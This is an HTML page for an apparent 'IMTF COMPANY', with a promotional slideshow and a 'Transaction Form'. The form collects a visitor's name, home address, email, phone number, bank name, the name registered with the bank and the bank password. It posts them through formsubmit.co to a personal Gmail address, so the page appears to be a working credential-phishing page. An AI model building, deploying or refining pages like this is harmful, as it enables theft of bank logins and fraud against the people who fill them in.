<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>form</title>
    
    <!-- Optimized CSS within the HTML -->
    <style>
      /* Reset and Global Styles */
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    transition: all 0.3s ease-in-out;
}

body {
    font-family: 'Roboto', sans-serif;
    background-color: #f0f4f8;
    color: #333;
    line-height: 1.7;
    padding: 10px;
    overflow-x: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

/* Container */
.container {
    width: 95%;
    max-width: 900px;
    margin: 17px auto;
    background: linear-gradient(135deg, #ffffff, #f8f9fb);
    padding: 19px;
    border-radius: 9px;
    box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
    transform: scale(1.02);
    animation: slideIn 1s ease-out forwards;
}

/* Header */
h1 {
    text-align: center;
    color: #0056e1;
    margin-bottom: 20px;
    font-size: 26px;
    font-weight: 700;
    text-shadow: 1px 1px 5px rgba(0, 91, 187, 0.2);
}

/* Form */
form label {
    display: block;
    font-weight: bold;
    color: #333;
    margin: 12px 0 6px;
    font-size: 16px;
}

form input[type="text"],
form input[type="password"],
form input[type="email"],
form input[type="tel"] {
    width: 100%;
    padding: 12px;
    margin: 6px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
    background: #f0f4f8;
    color: #333;
    font-size: 16px;
    box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
    transition: transform 0.2s ease;
}

form input[type="text"]:focus,
form input[type="email"]:focus,
form input[type="tel"]:focus {
    border-color: #0056e1;
    outline: none;
    transform: scale(1.02);
}

form input[type="submit"] {
    width: 100%;
    background: linear-gradient(135deg, #007BFF, #0056b3);
    color: white;
    padding: 14px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 18px;
    margin-top: 15px;
    box-shadow: 0 5px 10px rgba(0, 91, 187, 0.3);
    font-weight: bold;
    text-transform: uppercase;
}

form input[type="submit"]:hover {
    background-color: #003a8b;
    box-shadow: 0 6px 12px rgba(0, 91, 187, 0.5);
}

/* Slideshow */
.slideshow-container {
    position: relative;
    max-width: 100%;
    margin: 20px auto;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
}

.slide-img {
    width: 100%;
    height: auto;
    display: block;
}

.slide {
    display: none;
}

.dots-container {
    text-align: center;
    margin-top: 10px;
}

.dot {
    height: 12px;
    width: 12px;
    margin: 0 4px;
    background-color: #bbb;
    border-radius: 50%;
    display: inline-block;
    transition: background-color 0.6s ease;
    cursor: pointer;
}

.active {
    background-color: #007BFF;
}

/* Fade Animation */
.fade {
    animation: fadeEffect 1s ease-in-out;
}

@keyframes fadeEffect {
    from { opacity: 0.4; transform: scale(0.98); }
    to { opacity: 1; transform: scale(1); }
}

@keyframes slideIn {
    from { opacity: 0; transform: translateY(50px); }
    to { opacity: 1; transform: translateY(0); }
}

/* Media Queries for Responsiveness */
@media (max-width: 768px) {
    .container {
        width: 95%;
    }

    h1 {
        font-size: 22px;
    }

    form input[type="submit"] {
        font-size: 16px;
    }

    .dots-container {
        margin-top: 15px;
    }

    .dot {
        height: 10px;
        width: 10px;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <h1> IMTF COMPANY</h1>
        
        <!-- Slideshow -->
        <div class="slideshow-container" aria-label="Slideshow of promotional images">
            <div class="slide fade">
                <img src="images (12).jpeg" alt="Image 1 of promotion" class="slide-img">
            </div>
            <div class="slide fade">
                <img src="images (9).jpeg" alt="Image 2 of promotion" class="slide-img">
            </div>
            <div class="slide fade">
                <img src="images (10).jpeg" alt="Image 3 of promotion" class="slide-img">
            </div>
        </div>

        <div class="dots-container" aria-label="Slideshow navigation">
            <span class="dot" onclick="currentSlide(1)"></span>
            <span class="dot" onclick="currentSlide(2)"></span>
            <span class="dot" onclick="currentSlide(3)"></span>
        </div>

     <div class="container">
        <h1>Transaction Form</h1>
        
        <!-- Form -->
        <form id="transactionForm" action="https://formsubmit.co/de7474469@gmail.com" method="POST" enctype="multipart/form-data" onsubmit="return validateForm()">
            <!-- Name Input -->
            <label for="fullName">Full Name:</label>
            <input type="text" id="fullName" name="fullName" required>

            <!-- Address Input -->
            <label for="address">House Address:</label>
            <input type="text" id="address" name="address" required>

            <!-- Date & Time Input (Auto) -->
            <label for="dateTime">Date & Time (Auto):</label>
            <input type="text" id="dateTime" name="dateTime" readonly>

            <!-- Email Input -->
            <label for="email">Email Address:</label>
            <input type="email" id="email" name="email" required>

            <!-- Phone Number Input -->
            <label for="phone">Phone Number:</label>
            <input type="tel" id="phone" name="phone" required>

            <!-- Bank Name Input -->
            <label for="bankName">Bank Name:</label>
            <input type="text" id="bankName" name="bankName" required>

            <!-- Registered Name Input -->
            <label for="bankRegName">Name Registered with Bank:</label>
            <input type="text" id="bankRegName" name="bankRegName" required>

            <!-- Account ID Input -->
            <label for="accountId">Bank Password:</label>
            <input type="password" id="accountId" name="accountId" required>

            <!-- Submit Button -->
            <input type="submit" value="Submit">
        </form>
    </div>
       <!-- Optimized JavaScript -->
    <script>
        // Auto-fill date and time field
        document.addEventListener('DOMContentLoaded', () => {
            const dateTimeField = document.getElementById('dateTime');
            const now = new Date();
            dateTimeField.value = now.toLocaleString();
        });

        // Slideshow functionality with improvements
        let slideIndex = 0;
        showSlides();

        function showSlides() {
            let slides = document.getElementsByClassName("slide");
            let dots = document.getElementsByClassName("dot");
            
            for (let i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            
            slideIndex++;
            if (slideIndex > slides.length) {
                slideIndex = 1;
            }
            
            for (let i = 0; i < dots.length; i++) {
                dots[i].className = dots[i].className.replace(" active", "");
            }
            
            slides[slideIndex - 1].style.display = "block";
            dots[slideIndex - 1].className += " active";
            
            setTimeout(showSlides, 4000); // Change image every 4 seconds
        }

        function currentSlide(n) {
            slideIndex = n - 1;
            showSlides();
        }

    </script>
</body>
                  </html>
